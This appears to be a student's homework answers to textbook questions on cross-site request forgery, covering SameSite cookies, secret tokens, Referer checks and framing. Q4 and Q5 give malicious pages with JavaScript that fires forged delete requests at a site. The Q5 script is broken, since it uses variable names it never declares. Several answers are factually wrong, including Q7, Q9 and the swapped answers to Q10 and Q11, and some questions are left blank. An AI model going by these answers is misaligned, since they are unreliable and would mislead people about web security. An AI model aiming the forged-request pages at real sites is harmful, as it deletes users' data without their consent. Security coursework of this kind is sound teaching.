# Q1. Explain why the same-site cookie can help prevent CSRF attacks.
ANS => THE SAME SITE ATTRIBUTE GIVES THE POSIBILITY TO DISABLE THIRD PARTY USAGE COOKIES. THIS HOW EVER CAN BE A GOOD METHOD OF PREVENTING CSRF ATTACKS.

# Q2. Explain how a website can use secret token to prevent CSRF attacks, and why does it work?
ANS => To start with, you can store the token in a hidden input value, session, and event send a refresh request to your backend and store the cookies. A csrf token is a secured random token that is being generated when ever you reload your page... This tokens can be changed and cah be difficult to guess. but, I recommend that. soon as the user reloads his browser send the random token to your backend and store it. Then bring back a request of the token you stored and insert it in to the hidden input field. eg..

{ 
// This is a code for the backend.
let storedtoken = 2839-dandi-48e9w-fdaid;
// This ^ stored token has already been stored and saved to your backend.
let submitedtoken = 2839-dandi-48e9w-fdaid;
if(storedtoken === submitedtoken){
// Run action
}
else 
  response.send("Invalid token. please reload your browser")

}

// by doing this, if the user tries to change the hidden value in the browser inspection, I't will be invalid... and make sure to accepte request and response only from one URL.

# Q3. These days, most of the websites use HTTPS, instead of HTTP. Do we still need to worry about CSRF attacks?

ANS => YES!... HTTPS just encrypts traffic between the client and the server, but does little to detect where the information came from.


# Q4. Using LiveHTTPHeader, we find out that the following GET request is used to send an HTTP request to www.example.com to delete a page owned by a user (only the owner of a page can delete the page).


Please construct a simple malicious web page, so when a victim visits this web page, a forged request will be launched against www.example.com to delete a page belonging to the user.


ANS ={

<script>
   function attack(){

 var Ajax=null;
        var sendurl="http://www.example.com/delete.php?pageid=5";
        Ajax=new XMLHttpRequest();
        Ajax.open("GET",sendurl,true);
        Ajax.setRequestHeader("Host","www.example.com");
        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        Ajax.send();

}
attack();
</script>

}

# Q5. . Using LiveHTTPHeader, we find out that the following POST request is used to send an HTTP request to www.example.com to delete a page owned by a user (only the owner of a page can delete the page).


Please construct a simple malicious web page, so when a victim visits this web page, a forged request will be launched against www.example.com to delete a page belonging to the user.




Ans 
 => {

<script>
    window.onload = function () {
        var tss="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var tokens="&__elgg_token="+elgg.security.token.__elgg_token;
        var content1=ts+token+"&pageid=5";
        var sammigud=47; //FILL IN
        if(elgg.session.user.guid!=samyGuid)
        {
            var Ajax=new XMLHttpRequest();
            var sendurl="http://www.example.com/delete.php";
            Ajax.open("POST",sendurl,true);
            Ajax.setRequestHeader("Host","www.example.com");
            Ajax.setRequestHeader("Content-Type","application/x-www-formurlencoded");
            Ajax.send(content);
        }
    }
</script>


}


# Q6. The forged HTTP request against Elgg in this chapter needs Boby’s user id (guid) to work properly. If Alice targets Boby specifically, before the attack, she needs to find ways to get Boby’s user id. Alice does not know Boby’s Elgg password, so she cannot log into Boby’s account to get the information. Please describe how Alice can find out Boby’s user id.


ANS => 
CSRF ATTACKER EXPLOITS THE USERS CURRENT SESSION OF THE USER, IF THE ATTACKER IS UNABLE TO GET A CURRENT SESSION, THERE WILL BE NO CSRF ATTACK.


# Q7.  In a request, there is an user id, which is a random number generated by the server. The ID information can be found from the user’s page from the server. If an attacker does not know this user ID, can he/she still launch an CSRF attack on this service?

ANS => No! it's inpossible to read content of another page without knowing of the id. No forged request will be sent.

# Q8. ??? 

# Q9.  When a web page sends a request to its server, the session ID is always attached in the cookie section of the HTTP header. A web application requires all the requests from its own page to also attach the session ID in its data part (for GET requests, the session ID is attached in the URL, while for POST requests, the session ID is included in the payload). This sounds redundant, because the session ID is already included in the request. However, by checking whether a request has the session ID in its data part, the web server can tell whether a request is a cross-site request or not. Please explain why.

ANS => THIS IS TO MAKE SURE THAT EVERYTHING YOU STORED IN A JSON FORMAT WITH AJAX HAS BEEN SUBMITED.

# Q10. Do browsers know whether an HTTP request is cross-site or not? 

ANS => it depends on how the server is written. if the server embeds a special token in each page, aand expects that as part of the request, the presence of the token can tell if same site / cross site.

# Q11. Do servers know whether an HTTP request is cross-site or not?

ANS => Yes!. The browser do know which page and request is originated from and they also know which site a request is being send to....

# Q 12. Why cannot a web server use the referer header to tell whether a request is cross-site or not?

a lot of browsers remove the referer header before sending requests to a server to respect the privacy of users..

# Q 13. Why is it important for a server to know whether a request is cross-site or not? 
ANS = ?

# Q 14. Can we simply ask browsers not to attach any cookie for cross-site requests? 

ANS => Hmmm! I don't think so.

# Q15. If a page from www.example.com contains an iframe, inside which a facebook
page is displayed. If a request is sent from inside the iframe, is it considered as a cross-site request or not? If not, how can be this secured?

ANS => yes possibely... Just like facebook stop your website from loading in an iframe... example ={ <?PHP
header('X-Frame-Options: SAMEORIGIN');
?>

}

use this code.. Either with javascript or php or any language.


